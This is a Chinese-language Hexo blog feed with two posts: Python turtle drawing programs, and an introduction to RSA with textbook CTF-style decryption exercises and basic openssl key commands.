<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-12-10T13:48:41.656Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Aron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Turtle Road</title>
    <link href="http://example.com/2020/12/10/Python_Turtle/"/>
    <id>http://example.com/2020/12/10/Python_Turtle/</id>
    <published>2020-12-10T13:38:45.624Z</published>
    <updated>2020-12-10T13:48:41.656Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Turtle-Road"><a href="#Turtle-Road" class="headerlink" title="Turtle Road"></a>Turtle Road</h3><a id="more"></a><h3 id="一-五角星"><a href="#一-五角星" class="headerlink" title="一.五角星"></a>一.五角星</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line">turtle.hideturtle()  <span class="comment">#隐藏海龟图案</span></span><br><span class="line">turtle.color(<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;red&#x27;</span>) <span class="comment">#color1=pencolor,color2=fillcolor</span></span><br><span class="line">turtle.setup(width=<span class="number">700</span>,height=<span class="number">700</span>) <span class="comment">#设置画布</span></span><br><span class="line">turtle.begin_fill() <span class="comment">#填充颜色</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment">#循环画线</span></span><br><span class="line">    turtle.forward(<span class="number">150</span>) <span class="comment">#在给定方向上前进150像素长度，默认初始方向向右</span></span><br><span class="line">    turtle.rt(<span class="number">144</span>) <span class="comment">#在现方向上右转144度</span></span><br><span class="line">turtle.end_fill() <span class="comment">#结束填充</span></span><br><span class="line">turtle.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二-科赫雪花"><a href="#二-科赫雪花" class="headerlink" title="二.科赫雪花"></a>二.科赫雪花</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">koch</span>(<span class="params">size,n</span>):</span>             <span class="comment">#递归函数</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">        t.fd(size)            <span class="comment">#阶数为0时，为一直线</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">60</span>,-<span class="number">120</span>,<span class="number">60</span>]:</span><br><span class="line">            t.left(i)</span><br><span class="line">            koch(size/<span class="number">3</span>,n-<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    t.screensize(<span class="number">600</span>,<span class="number">600</span>)  <span class="comment">#调整画布大小</span></span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(-<span class="number">120</span>,<span class="number">120</span>)</span><br><span class="line">    t.pensize(<span class="number">1</span>)</span><br><span class="line">    t.pencolor(<span class="string">&quot;blue&quot;</span>)   <span class="comment">#蓝色画笔描边</span></span><br><span class="line">    t.pendown()</span><br><span class="line">    t.speed(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    level=<span class="number">3</span>              <span class="comment">#三阶科赫雪花，阶数：3</span></span><br><span class="line">    t.fillcolor(<span class="string">&quot;blue&quot;</span>) <span class="comment">#填充蓝色</span></span><br><span class="line">    t.begin_fill()       <span class="comment">#填充开始</span></span><br><span class="line">    </span><br><span class="line">    koch(<span class="number">210</span>,level)</span><br><span class="line">    t.right(<span class="number">120</span>)</span><br><span class="line">    koch(<span class="number">210</span>,level)</span><br><span class="line">    t.right(<span class="number">120</span>)</span><br><span class="line">    koch(<span class="number">210</span>,level)</span><br><span class="line">    t.right(<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line">    t.end_fill()<span class="comment">#填充结束</span></span><br><span class="line">    </span><br><span class="line">    t.fillcolor(<span class="string">&#x27;white&#x27;</span>) <span class="comment">#中心画圆，这块折腾有点麻烦，数学太差</span></span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.penup()   <span class="comment">#抬笔，如果缺少而直接转，相当于从这点向目标位置划线。</span></span><br><span class="line">    t.goto(-<span class="number">25</span>,<span class="number">35</span>) <span class="comment">#直接转到坐标值为（x,y)处，默认初始点为（0,0）</span></span><br><span class="line">    t.down()  <span class="comment">#落笔</span></span><br><span class="line">    t.circle(<span class="number">30</span>) <span class="comment">#画圆，参数为正则从底部向上，反之向下。</span></span><br><span class="line">    t.end_fill()</span><br><span class="line">    </span><br><span class="line">    t.hideturtle()      <span class="comment">#隐藏画笔</span></span><br><span class="line">    t.done() <span class="comment">#完成</span></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这个要用到递归还是挺SAO的。</span><br></pre></td></tr></table></figure><h3 id="三-柱状图"><a href="#三-柱状图" class="headerlink" title="三.柱状图"></a>三.柱状图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle </span><br><span class="line">heights=[<span class="number">17751</span>,<span class="number">32127</span>,<span class="number">32567</span>,<span class="number">46726</span>,<span class="number">54643</span>] <span class="comment">#各柱高度</span></span><br><span class="line">turtle.setup(<span class="number">1.0</span>,<span class="number">1.0</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"> t = turtle.Turtle()</span><br><span class="line"> t.pencolor(<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"> t.forward(<span class="number">420</span>)</span><br><span class="line"> t.penup()</span><br><span class="line"> t.goto(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"> t.down()</span><br><span class="line"> t.left(<span class="number">90</span>)</span><br><span class="line"> t.forward(<span class="number">326.6</span>) </span><br><span class="line"> drawjiantou(t)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">   drawFilledRecentage(t,<span class="number">80</span>*i,<span class="number">0</span>,<span class="number">50</span>,heights[i]/<span class="number">200</span>)</span><br><span class="line"> displayText(t)</span><br><span class="line"> t.hideturtle()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawjiantou</span>(<span class="params">t<span class="comment">#箭头不好画吖，绕的头晕。</span></span></span></span><br><span class="line"><span class="function"><span class="params">    t.penup(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.goto(<span class="params">-<span class="number">20</span>,<span class="number">290</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.right(<span class="params"><span class="number">30</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.down(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.forward(<span class="params"><span class="number">40</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.right(<span class="params"><span class="number">120</span></span>) <span class="comment">#右转120度</span></span></span></span><br><span class="line"><span class="function"><span class="params">    t.forward(<span class="params"><span class="number">40</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.penup(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.goto(<span class="params"><span class="number">386</span>,<span class="number">20</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.left(<span class="params"><span class="number">30</span></span>) <span class="comment">#左转30度</span></span></span></span><br><span class="line"><span class="function"><span class="params">    t.down(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.forward(<span class="params"><span class="number">40</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.right(<span class="params"><span class="number">120</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    t.forward(<span class="params"><span class="number">40</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">def</span> drawFilledRecentage(<span class="params">t,x,y,w,h</span>):  <span class="comment">#画柱状图</span></span></span></span><br><span class="line"><span class="function"><span class="params"> t.pencolor(<span class="params"><span class="string">&#x27;black&#x27;</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.fillcolor(<span class="params"><span class="string">&#x27;blue&#x27;</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.penup(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.goto(<span class="params">x,y</span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.down(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.begin_fill(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.goto(<span class="params">x+w,y</span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.goto(<span class="params">x+w,y+h</span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.goto(<span class="params">x,y+h</span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.goto(<span class="params">x,y</span>)</span></span></span><br><span class="line"><span class="function"><span class="params"> t.end_fill(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">def</span> displayText(<span class="params">t</span>): <span class="comment">#类名及其数量显示</span></span></span></span><br><span class="line"><span class="function"><span class="params">  groups=[<span class="string">&#x27;education&#x27;</span>,<span class="string">&#x27;Philosophy&#x27;</span>,<span class="string">&#x27;history&#x27;</span>,<span class="string">&#x27;Manage&#x27;</span>,<span class="string">&#x27;Law&#x27;</span>]</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  t.pencolor(<span class="params"><span class="string">&#x27;black&#x27;</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.penup(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="params"><span class="number">5</span></span>):</span></span></span><br><span class="line"><span class="function"><span class="params">   t.goto(<span class="params">(<span class="params"><span class="number">20</span>+<span class="number">80</span>*i</span>),<span class="number">20</span>+heights[i]/<span class="number">200</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">   t.write(<span class="params"><span class="built_in">str</span>(<span class="params">heights[i]</span>),align=<span class="string">&quot;center&quot;</span>,font=(<span class="params"><span class="string">&quot;Arial&quot;</span>,<span class="number">15</span>,<span class="string">&quot;normal&quot;</span></span>)</span>)</span></span></span><br><span class="line"><span class="function"><span class="params">   t.goto(<span class="params">(<span class="params"><span class="number">20</span>+<span class="number">80</span>*i</span>),-<span class="number">20</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">   t.write(<span class="params">groups[i],align=<span class="string">&quot;center&quot;</span>,font=(<span class="params"><span class="string">&quot;Arial&quot;</span>,<span class="number">10</span>,<span class="string">&quot;normal&quot;</span></span>)</span>)</span></span></span><br><span class="line"><span class="function"><span class="params">   t.penup(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.goto(<span class="params"><span class="number">0</span>,-<span class="number">80</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.write(<span class="params"><span class="string">&quot;Book Statistics of CUMT library&quot;</span>,font=(<span class="params"><span class="string">&quot;Arial&quot;</span>,<span class="number">30</span>,<span class="string">&quot;normal&quot;</span></span>)</span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.penup(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.goto(<span class="params"><span class="number">450</span>,-<span class="number">10</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.write(<span class="params"><span class="string">&quot;Group&quot;</span>,font=(<span class="params"><span class="string">&quot;Arial&quot;</span>,<span class="number">20</span>,<span class="string">&quot;normal&quot;</span></span>)</span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.penup(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.goto(<span class="params">-<span class="number">40</span>,<span class="number">326</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  t.write(<span class="params"><span class="string">&quot;Number&quot;</span>,font=(<span class="params"><span class="string">&quot;Arial&quot;</span>,<span class="number">20</span>,<span class="string">&quot;normal&quot;</span></span>)</span>)</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">main(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br></pre></td></tr></table></figure><h3 id="四-分形树"><a href="#四-分形树" class="headerlink" title="四.分形树"></a>四.分形树</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> Turtle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawtree</span>(<span class="params">p,l,a,f,n</span>):</span> <span class="comment">#深度优先,其中参数：l=length，该方向上前进长度值;a=angle，偏转角度，n为树的深度，f使深度增加时length递减。</span></span><br><span class="line">    <span class="keyword">if</span> n&gt;<span class="number">0</span>:</span><br><span class="line">        p.fd(l)</span><br><span class="line">        q=p.clone()    <span class="comment">#将画笔当前的属性返回给q</span></span><br><span class="line">        p.left(a)</span><br><span class="line">        q.right(a)</span><br><span class="line">        drawtree(p, l*f, a, f,n-<span class="number">1</span>)</span><br><span class="line">        drawtree(q, l*f, a, f,n-<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maketree</span>(<span class="params">x,y,n</span>):</span>     </span><br><span class="line">    p = Turtle()</span><br><span class="line">    p.color(<span class="string">&quot;green&quot;</span>,<span class="string">&quot;white&quot;</span>)</span><br><span class="line">    p.pensize(<span class="number">2</span>)</span><br><span class="line">    p.speed(<span class="number">15</span>)</span><br><span class="line">    p.ht()  <span class="comment">#隐藏画笔</span></span><br><span class="line">    p.left(<span class="number">90</span>) <span class="comment">#使画笔方向向上</span></span><br><span class="line">    p.penup() </span><br><span class="line">    p.goto(x,y)</span><br><span class="line">    p.pendown()</span><br><span class="line">    p.down()</span><br><span class="line">    drawtree(p,<span class="number">180</span>, <span class="number">80</span>, <span class="number">0.675</span>,n)    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    maketree(-<span class="number">150</span>,-<span class="number">150</span>,<span class="number">9</span>)</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可能有点小BUG，用python2执行的时候，老是卡掉，3的话倒是可以，智商无解。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Turtle-Road&quot;&gt;&lt;a href=&quot;#Turtle-Road&quot; class=&quot;headerlink&quot; title=&quot;Turtle Road&quot;&gt;&lt;/a&gt;Turtle Road&lt;/h3&gt;</summary>
    
    
    
    <category term="编程" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>RSA初探</title>
    <link href="http://example.com/2020/12/08/RSA%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2020/12/08/RSA%E5%88%9D%E6%8E%A2/</id>
    <published>2020-12-08T11:41:10.000Z</published>
    <updated>2020-12-10T12:45:25.558Z</updated>
    
    <content type="html"><![CDATA[<h4 id="RSA初探"><a href="#RSA初探" class="headerlink" title="RSA初探"></a>RSA初探</h4><h5 id="0x01-简介："><a href="#0x01-简介：" class="headerlink" title="0x01.简介："></a>0x01.简介：</h5><p>RSA,非对称加密算法，基于大整数因式分解的难题。对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的 RSA 钥匙才可能被强力方式破解。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被破解的。</p><h5 id="0x02-具体实现："><a href="#0x02-具体实现：" class="headerlink" title="0x02.具体实现："></a>0x02.具体实现：</h5><p>假设Alice从不可靠信道接收Bob一条私人消息。她可以用以下的方式来产生一个<strong>公钥</strong>和一个<strong>私钥</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.任意两个大素数：p,q,且p !&#x3D; q,令n &#x3D; p*q;</span><br><span class="line">2.根据欧拉函数，求得r &#x3D; φ(N) &#x3D; φ(p)*φ(q) &#x3D; (p-1)(q-1);</span><br><span class="line">3.选择任意e，使得(e,r)&#x3D;&#x3D;1,即两数互素，并有e*d &#x3D;&#x3D; 1 mod r , 求出e关于模r的逆元d;</span><br><span class="line">                 1 &lt; E &lt; φ(N)</span><br><span class="line">                 gcd(E,φ(N)) &#x3D; 1</span><br><span class="line">4.(e,n)为加密公钥，(d,n)为解密私钥</span><br></pre></td></tr></table></figure><p>此时已知公钥和私钥：<br>$$<br>加密：<br>c=m^e mod (n)<br>$$</p><p>$$<br>解密:<br>m=c^d mod (n);<br>$$</p><p>其中 <strong>c</strong> 为 cipheretext(密文) , <strong>m</strong> 为plaintext(明文)。</p><p>在线分解大整数N(p*q)  :  <a href="http://factordb.com/">http://factordb.com/</a></p><h5 id="0x03-小结："><a href="#0x03-小结：" class="headerlink" title="0x03.小结："></a>0x03.小结：</h5><table><thead><tr><th align="left">求N</th><th align="left">N＝ p ＊ q ；p，q为大质数</th></tr></thead><tbody><tr><td align="left">求φ(N)</td><td align="left">φ(N)＝ (p－1，q－1)</td></tr><tr><td align="left">求E</td><td align="left">1 &lt; E &lt; φ(N)，gcd(E，φ(N))=1；E，φ(N)最大公约数为1（E和φ(N)互质）</td></tr><tr><td align="left">求D</td><td align="left">1 &lt; D &lt; φ(N)，(E＊D) mod φ(N) ＝ 1</td></tr></tbody></table><h5 id="0x04-常见RSA题型"><a href="#0x04-常见RSA题型" class="headerlink" title="0x04.常见RSA题型"></a>0x04.常见RSA题型</h5><p><img src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20201115203936.png" alt="RSA题目类型"></p><h6 id="（1）已知p-q-e，求解d"><a href="#（1）已知p-q-e，求解d" class="headerlink" title="（1）已知p,q,e，求解d:"></a>（1）已知p,q,e，求解d:</h6><p>题目：</p><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17<br>求解出d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)  <span class="comment">#求φ(N)</span></span><br><span class="line">d=gmpy2.invert(e,phi) <span class="comment">#求逆元d</span></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>此处涉及python两个重要模块, gmpy2和Crypto，Ubuntu下安装教程：</p><p>gmpy2(<a href="https://blog.csdn.net/qq_28573835/article/details/86164877">https://blog.csdn.net/qq_28573835/article/details/86164877</a>)</p><p>Crypto(<a href="https://blog.csdn.net/zhangpeterx/article/details/96428212">https://blog.csdn.net/zhangpeterx/article/details/96428212</a>)</p><p>已知p,q,e，相当于已知模φ(N)=(p-1)<em>(q-1);，由 e</em>d ==1 mod φ(N),即d为 e模φ(N)的逆元，gmpy2.invert()可直接求出逆元d.</p><h6 id="2-已知p、q、e、密文c，求明文m"><a href="#2-已知p、q、e、密文c，求明文m" class="headerlink" title="(2)已知p、q、e、密文c，求明文m"></a>(2)已知p、q、e、密文c，求明文m</h6><p>SWPUCTF 一道RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;c=&#x27;</span>, <span class="string">&#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;e=&#x27;</span>, <span class="string">&#x27;0x872a335&#x27;</span>)</span><br><span class="line"><span class="comment">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line"><span class="comment">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">b = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line">e = <span class="number">0x872a335</span></span><br><span class="line">c = <span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line"></span><br><span class="line">gcd_ = gcd(a, b)        <span class="comment"># 求a,b最大公因子:q*(1+p)</span></span><br><span class="line">p = b // gcd_  </span><br><span class="line">q = b // (p*(p+<span class="number">1</span>))</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)  <span class="comment">#求解密秘钥d</span></span><br><span class="line"><span class="comment">#print(d)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment">#因为pow(a,b,c)含义为a^b mod c,此处即解密公式：m = c^d mod n</span></span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m)) <span class="comment">#长整型转字节，或使用long2str(m)</span></span><br><span class="line"><span class="comment">#参考：https://pythonhosted.org/pycrypto/Crypto.Util.number-module.html</span></span><br></pre></td></tr></table></figure><h6 id="（3）暂定。"><a href="#（3）暂定。" class="headerlink" title="（3）暂定。"></a>（3）暂定。</h6><h5 id="0x05-openssl与RSA："><a href="#0x05-openssl与RSA：" class="headerlink" title="0x05.openssl与RSA："></a>0x05.openssl与RSA：</h5><h6 id="1-生成私钥："><a href="#1-生成私钥：" class="headerlink" title="(1).生成私钥："></a>(1).生成私钥：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl 生成并输入一个RSA私钥 输出参数 私钥名称 对应的n</span><br><span class="line">openssl genrsa -out private.pem <span class="number">1024</span></span><br></pre></td></tr></table></figure><h6 id="2-提取公钥："><a href="#2-提取公钥：" class="headerlink" title="(2)提取公钥："></a>(2)提取公钥：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl 处理RSA密钥的格式转换等问题 提取 输出参数 公钥名称</span><br><span class="line">openssl rsa -<span class="keyword">in</span> private.pem -pubout -out public.pem</span><br></pre></td></tr></table></figure><h6 id="3-使用公钥对明文加密："><a href="#3-使用公钥对明文加密：" class="headerlink" title="(3)使用公钥对明文加密："></a>(3)使用公钥对明文加密：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -encrypt -<span class="keyword">in</span> message.txt -inkey public.pem -pubin -out enc.txt</span><br></pre></td></tr></table></figure><h6 id="4-使用私钥对密文解密："><a href="#4-使用私钥对密文解密：" class="headerlink" title="(4)使用私钥对密文解密："></a>(4)使用私钥对密文解密：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> enc.txt -inkey private.pem -out dec.txt</span><br></pre></td></tr></table></figure><h6 id="5-使用私钥进行签名："><a href="#5-使用私钥进行签名：" class="headerlink" title="(5)使用私钥进行签名："></a>(5)使用私钥进行签名：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -sign -<span class="keyword">in</span> message.txt -inkey private.pem -out enc.<span class="built_in">bin</span></span><br></pre></td></tr></table></figure><h6 id="6-使用公钥进行验证："><a href="#6-使用公钥进行验证：" class="headerlink" title="(6)使用公钥进行验证："></a>(6)使用公钥进行验证：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -verify -<span class="keyword">in</span> enc.<span class="built_in">bin</span> -inkey public.pem -pubin -out dec.txt</span><br></pre></td></tr></table></figure><h6 id="7-查看证书内容："><a href="#7-查看证书内容：" class="headerlink" title="(7)查看证书内容："></a>(7)查看证书内容：</h6><p>（1）将私钥转换为文本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> private.pem -text -out private.txt</span><br></pre></td></tr></table></figure><p>(2)将公钥转换为文本</p><figure class="highlight 